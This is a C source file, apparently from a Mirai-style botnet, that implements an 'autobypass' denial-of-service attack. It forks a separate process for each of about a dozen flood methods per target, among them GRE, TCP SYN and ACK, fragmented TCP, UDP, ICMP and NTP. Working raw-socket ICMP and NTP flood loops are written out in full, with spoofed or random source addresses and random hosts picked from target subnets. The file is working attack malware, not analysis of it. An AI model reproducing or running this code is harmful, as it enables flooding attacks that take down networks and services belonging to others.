#define _GNU_SOURCE
#include <stdlib.h>
#include <unistd.h>
#include <string.h>
#include <sys/socket.h>
#include <linux/ip.h>
#include <linux/tcp.h>
#include <linux/udp.h>
#include <netinet/in.h>
#include <arpa/inet.h>
#include <fcntl.h>
#include <errno.h>
#include <time.h>
#include <stdio.h>
#include "includes.h"
#include "attack.h"
#include "rand.h"
#include "util.h"
#include "checksum.h"
#include "protocol.h"
struct icmphdr {
    uint8_t type;
    uint8_t code;
    uint16_t checksum;
    union {
        struct {
            uint16_t id;
            uint16_t sequence;
        } echo;
        uint32_t gateway;
        struct {
            uint16_t __unused;
            uint16_t mtu;
        } frag;
    } un;
};
extern void attack_method_greip(uint8_t, struct attack_target *, uint8_t, struct attack_option *);
extern void attack_method_greeth(uint8_t, struct attack_target *, uint8_t, struct attack_option *);
extern void attack_tcp_syn(uint8_t, struct attack_target *, uint8_t, struct attack_option *);
extern void attack_tcp_ack(uint8_t, struct attack_target *, uint8_t, struct attack_option *);
extern void attack_method_tcpall(uint8_t, struct attack_target *, uint8_t, struct attack_option *);
extern void attack_method_udpgeneric(uint8_t, struct attack_target *, uint8_t, struct attack_option *);
extern void attack_method_tcp(uint8_t, struct attack_target *, uint8_t, struct attack_option *);
extern void attack_method_tcpfrag(uint8_t, struct attack_target *, uint8_t, struct attack_option *);
extern void attack_tcp_bypass(uint8_t, struct attack_target *, uint8_t, struct attack_option *);
extern void attack_method_ice(uint8_t, struct attack_target *, uint8_t, struct attack_option *);
static void autobypass_greip_thread(struct attack_target *target, uint8_t opts_len, struct attack_option *opts)
{
    struct attack_target targs[1];
    targs[0] = *target;
    attack_method_greip(1, targs, opts_len, opts);
}
static void autobypass_greeth_thread(struct attack_target *target, uint8_t opts_len, struct attack_option *opts)
{
    struct attack_target targs[1];
    targs[0] = *target;
    attack_method_greeth(1, targs, opts_len, opts);
}
static void autobypass_tcp_syn_thread(struct attack_target *target, uint8_t opts_len, struct attack_option *opts)
{
    struct attack_target targs[1];
    targs[0] = *target;
    attack_tcp_syn(1, targs, opts_len, opts);
}
static void autobypass_tcp_ack_thread(struct attack_target *target, uint8_t opts_len, struct attack_option *opts)
{
    struct attack_target targs[1];
    targs[0] = *target;
    attack_tcp_ack(1, targs, opts_len, opts);
}
static void autobypass_tcp_all_thread(struct attack_target *target, uint8_t opts_len, struct attack_option *opts)
{
    struct attack_target targs[1];
    targs[0] = *target;
    attack_method_tcpall(1, targs, opts_len, opts);
}
static void autobypass_udp_thread(struct attack_target *target, uint8_t opts_len, struct attack_option *opts)
{
    struct attack_target targs[1];
    targs[0] = *target;
    attack_method_udpgeneric(1, targs, opts_len, opts);
}
static void autobypass_tcp_thread(struct attack_target *target, uint8_t opts_len, struct attack_option *opts)
{
    struct attack_target targs[1];
    targs[0] = *target;
    attack_method_tcp(1, targs, opts_len, opts);
}
static void autobypass_tcp_frag_thread(struct attack_target *target, uint8_t opts_len, struct attack_option *opts)
{
    struct attack_target targs[1];
    targs[0] = *target;
    attack_method_tcpfrag(1, targs, opts_len, opts);
}
static void autobypass_tcp_bypass_thread(struct attack_target *target, uint8_t opts_len, struct attack_option *opts)
{
    struct attack_target targs[1];
    targs[0] = *target;
    attack_tcp_bypass(1, targs, opts_len, opts);
}
static void autobypass_ice_thread(struct attack_target *target, uint8_t opts_len, struct attack_option *opts)
{
    struct attack_target targs[1];
    targs[0] = *target;
    attack_method_ice(1, targs, opts_len, opts);
}
static void autobypass_icmp_thread(struct attack_target *target, uint8_t opts_len, struct attack_option *opts)
{
    int fd;
    port_t dport = attack_get_opt_int(opts_len, opts, ATK_OPT_DPORT, 0);
    int threads = attack_get_opt_int(opts_len, opts, ATK_OPT_THREADS, 64);
    int data_len = attack_get_opt_int(opts_len, opts, ATK_OPT_PAYLOAD_SIZE, 64);
    uint8_t ip_ttl = attack_get_opt_int(opts_len, opts, ATK_OPT_IP_TTL, 64);
    uint8_t ip_tos = attack_get_opt_int(opts_len, opts, ATK_OPT_IP_TOS, 0);
    uint32_t source_ip = attack_get_opt_int(opts_len, opts, ATK_OPT_SOURCE, LOCAL_ADDR);
    if ((fd = socket(AF_INET, SOCK_RAW, IPPROTO_ICMP)) == -1)
        return;
    int i = 1;
    if (setsockopt(fd, IPPROTO_IP, IP_HDRINCL, &i, sizeof(int)) == -1)
    {
        close(fd);
        return;
    }
    int sndbuf = 4 * 1024 * 1024;
    setsockopt(fd, SOL_SOCKET, SO_SNDBUF, &sndbuf, sizeof(sndbuf));
    fcntl(fd, F_SETFL, O_NONBLOCK | fcntl(fd, F_GETFL, 0));
    char packet[1510];
    struct iphdr *iph = (struct iphdr *)packet;
    struct icmphdr *icmph = (struct icmphdr *)(iph + 1);
    char *data = (char *)(icmph + 1);
    iph->version = 4;
    iph->ihl = 5;
    iph->tos = ip_tos;
    iph->tot_len = htons(sizeof(struct iphdr) + sizeof(struct icmphdr) + data_len);
    iph->ttl = ip_ttl;
    iph->protocol = IPPROTO_ICMP;
    iph->saddr = source_ip;
    iph->daddr = target->addr;
    icmph->type = 8;
    icmph->code = 0;
    if (data_len > 0)
        rand_str(data, data_len);
    struct sockaddr_in addr;
    addr.sin_family = AF_INET;
    addr.sin_addr.s_addr = target->addr;
    while (TRUE)
    {
        if (target->netmask < 32)
            iph->daddr = htonl(ntohl(target->addr) + (((uint32_t)rand_next()) >> target->netmask));
        else
            iph->daddr = target->addr;
        if (source_ip == 0xffffffff)
            iph->saddr = rand_next();
        iph->id = rand_next() & 0xffff;
        iph->check = 0;
        iph->check = checksum_generic((uint16_t *)iph, sizeof(struct iphdr));
        icmph->un.echo.id = rand_next() & 0xffff;
        icmph->un.echo.sequence = rand_next() & 0xffff;
        icmph->checksum = 0;
        icmph->checksum = checksum_generic((uint16_t *)icmph, sizeof(struct icmphdr) + data_len);
        if (data_len > 0)
            rand_str(data, data_len);
        addr.sin_addr.s_addr = iph->daddr;
        sendto(fd, packet, sizeof(struct iphdr) + sizeof(struct icmphdr) + data_len, MSG_NOSIGNAL, (struct sockaddr *)&addr, sizeof(addr));
    }
    close(fd);
}
static void autobypass_ntp_thread(struct attack_target *target, uint8_t opts_len, struct attack_option *opts)
{
    int fd;
    port_t dport = attack_get_opt_int(opts_len, opts, ATK_OPT_DPORT, 123);
    int threads = attack_get_opt_int(opts_len, opts, ATK_OPT_THREADS, 64);
    uint8_t ip_ttl = attack_get_opt_int(opts_len, opts, ATK_OPT_IP_TTL, 64);
    uint8_t ip_tos = attack_get_opt_int(opts_len, opts, ATK_OPT_IP_TOS, 0);
    uint32_t source_ip = attack_get_opt_int(opts_len, opts, ATK_OPT_SOURCE, LOCAL_ADDR);
    if ((fd = socket(AF_INET, SOCK_DGRAM, 0)) == -1)
        return;
    int sndbuf = 4 * 1024 * 1024;
    setsockopt(fd, SOL_SOCKET, SO_SNDBUF, &sndbuf, sizeof(sndbuf));
    fcntl(fd, F_SETFL, O_NONBLOCK | fcntl(fd, F_GETFL, 0));
    char ntp_packet[48];
    memset(ntp_packet, 0, sizeof(ntp_packet));
    ntp_packet[0] = 0x17;
    ntp_packet[1] = 0x00;
    ntp_packet[2] = 0x03;
    ntp_packet[3] = 0x2a;
    struct sockaddr_in addr;
    addr.sin_family = AF_INET;
    addr.sin_port = htons(dport);
    addr.sin_addr.s_addr = target->addr;
    while (TRUE)
    {
        if (target->netmask < 32)
            addr.sin_addr.s_addr = htonl(ntohl(target->addr) + (((uint32_t)rand_next()) >> target->netmask));
        else
            addr.sin_addr.s_addr = target->addr;
        for (int i = 0; i < 48; i++)
            ntp_packet[i] = rand_next() & 0xff;
        ntp_packet[0] = 0x17;
        ntp_packet[1] = 0x00;
        ntp_packet[2] = 0x03;
        ntp_packet[3] = 0x2a;
        sendto(fd, ntp_packet, sizeof(ntp_packet), MSG_NOSIGNAL, (struct sockaddr *)&addr, sizeof(addr));
    }
    close(fd);
}
void attack_autobypass(uint8_t targs_len, struct attack_target *targs, uint8_t opts_len, struct attack_option *opts)
{
    rand_init();
    port_t dport = attack_get_opt_int(opts_len, opts, ATK_OPT_DPORT, 80);
    int threads = attack_get_opt_int(opts_len, opts, ATK_OPT_THREADS, 64);
    int data_len = attack_get_opt_int(opts_len, opts, ATK_OPT_PAYLOAD_SIZE, 512);
    uint8_t ip_ttl = attack_get_opt_int(opts_len, opts, ATK_OPT_IP_TTL, 64);
    uint8_t ip_tos = attack_get_opt_int(opts_len, opts, ATK_OPT_IP_TOS, 0);
    char *protocols_str = attack_get_opt_str(opts_len, opts, ATK_OPT_AUTOBYPASS_PROTOCOLS, "all");
    int use_greip = 1, use_greeth = 1, use_tcp_syn = 1, use_tcp_ack = 1;
    int use_tcp_all = 1, use_udp = 1, use_tcp = 1, use_tcp_frag = 1;
    int use_tcp_bypass = 1, use_ice = 1, use_icmp = 1, use_ntp = 1;
    if (protocols_str && strcmp(protocols_str, "all") != 0)
    {
        use_greip = use_greeth = use_tcp_syn = use_tcp_ack = use_tcp_all = use_udp = use_tcp = use_tcp_frag = use_tcp_bypass = use_ice = use_icmp = use_ntp = 0;
        char *proto_copy = calloc(strlen(protocols_str) + 3, 1);
        if (proto_copy) {
            snprintf(proto_copy, strlen(protocols_str) + 3, ",%s,", protocols_str);
            if (strstr(proto_copy, ",greip,")) use_greip = 1;
            if (strstr(proto_copy, ",greeth,")) use_greeth = 1;
            if (strstr(proto_copy, ",tcpsyn,")) use_tcp_syn = 1;
            if (strstr(proto_copy, ",tcpack,")) use_tcp_ack = 1;
            if (strstr(proto_copy, ",tcpall,")) use_tcp_all = 1;
            if (strstr(proto_copy, ",udp,")) use_udp = 1;
            if (strstr(proto_copy, ",tcp,") && !strstr(proto_copy, ",tcpsyn,") && !strstr(proto_copy, ",tcpack,") && !strstr(proto_copy, ",tcpall,") && !strstr(proto_copy, ",tcpfrag,") && !strstr(proto_copy, ",tcpbypass,")) use_tcp = 1;
            if (strstr(proto_copy, ",tcpfrag,")) use_tcp_frag = 1;
            if (strstr(proto_copy, ",tcpbypass,")) use_tcp_bypass = 1;
            if (strstr(proto_copy, ",ice,")) use_ice = 1;
            if (strstr(proto_copy, ",icmp,")) use_icmp = 1;
            if (strstr(proto_copy, ",ntp,")) use_ntp = 1;
            free(proto_copy);
        }
    }
    struct attack_option *new_opts = calloc(opts_len + 10, sizeof(struct attack_option));
    if (!new_opts) return;
    int opt_idx = 0;
    for (int i = 0; i < opts_len; i++)
    {
        new_opts[opt_idx++] = opts[i];
    }
    new_opts[opt_idx].key = ATK_OPT_DPORT;
    char port_str[16];
    snprintf(port_str, sizeof(port_str), "%d", dport);
    new_opts[opt_idx].val = calloc(strlen(port_str) + 1, 1);
    util_strcpy(new_opts[opt_idx].val, port_str);
    opt_idx++;
    new_opts[opt_idx].key = ATK_OPT_THREADS;
    char threads_str[16];
    snprintf(threads_str, sizeof(threads_str), "%d", threads / 10 + 1);
    new_opts[opt_idx].val = calloc(strlen(threads_str) + 1, 1);
    util_strcpy(new_opts[opt_idx].val, threads_str);
    opt_idx++;
    new_opts[opt_idx].key = ATK_OPT_PAYLOAD_SIZE;
    char size_str[16];
    snprintf(size_str, sizeof(size_str), "%d", data_len);
    new_opts[opt_idx].val = calloc(strlen(size_str) + 1, 1);
    util_strcpy(new_opts[opt_idx].val, size_str);
    opt_idx++;
    new_opts[opt_idx].key = ATK_OPT_IP_TTL;
    char ttl_str[16];
    snprintf(ttl_str, sizeof(ttl_str), "%d", ip_ttl);
    new_opts[opt_idx].val = calloc(strlen(ttl_str) + 1, 1);
    util_strcpy(new_opts[opt_idx].val, ttl_str);
    opt_idx++;
    new_opts[opt_idx].key = ATK_OPT_IP_TOS;
    char tos_str[16];
    snprintf(tos_str, sizeof(tos_str), "%d", ip_tos);
    new_opts[opt_idx].val = calloc(strlen(tos_str) + 1, 1);
    util_strcpy(new_opts[opt_idx].val, tos_str);
    opt_idx++;
    uint8_t final_opts_len = opt_idx;
    for (int i = 0; i < targs_len; i++)
    {
        if (use_greip)
        {
            if (fork() == 0)
            {
                autobypass_greip_thread(&targs[i], final_opts_len, new_opts);
                exit(0);
            }
            usleep(10000);
        }
        if (use_greeth)
        {
            if (fork() == 0)
            {
                autobypass_greeth_thread(&targs[i], final_opts_len, new_opts);
                exit(0);
            }
            usleep(10000);
        }
        if (use_tcp_syn)
        {
            if (fork() == 0)
            {
                autobypass_tcp_syn_thread(&targs[i], final_opts_len, new_opts);
                exit(0);
            }
            usleep(10000);
        }
        if (use_tcp_ack)
        {
            if (fork() == 0)
            {
                autobypass_tcp_ack_thread(&targs[i], final_opts_len, new_opts);
                exit(0);
            }
            usleep(10000);
        }
        if (use_tcp_all)
        {
            if (fork() == 0)
            {
                autobypass_tcp_all_thread(&targs[i], final_opts_len, new_opts);
                exit(0);
            }
            usleep(10000);
        }
        if (use_udp)
        {
            if (fork() == 0)
            {
                autobypass_udp_thread(&targs[i], final_opts_len, new_opts);
                exit(0);
            }
            usleep(10000);
        }
        if (use_tcp)
        {
            if (fork() == 0)
            {
                autobypass_tcp_thread(&targs[i], final_opts_len, new_opts);
                exit(0);
            }
            usleep(10000);
        }
        if (use_tcp_frag)
        {
            if (fork() == 0)
            {
                autobypass_tcp_frag_thread(&targs[i], final_opts_len, new_opts);
                exit(0);
            }
            usleep(10000);
        }
        if (use_tcp_bypass)
        {
            if (fork() == 0)
            {
                autobypass_tcp_bypass_thread(&targs[i], final_opts_len, new_opts);
                exit(0);
            }
            usleep(10000);
        }
        if (use_ice)
        {
            if (fork() == 0)
            {
                autobypass_ice_thread(&targs[i], final_opts_len, new_opts);
                exit(0);
            }
            usleep(10000);
        }
        if (use_icmp)
        {
            if (fork() == 0)
            {
                autobypass_icmp_thread(&targs[i], final_opts_len, new_opts);
                exit(0);
            }
            usleep(10000);
        }
        if (use_ntp)
        {
            if (fork() == 0)
            {
                autobypass_ntp_thread(&targs[i], final_opts_len, new_opts);
                exit(0);
            }
            usleep(10000);
        }
    }
    while (TRUE)
    {
        sleep(1);
    }
}
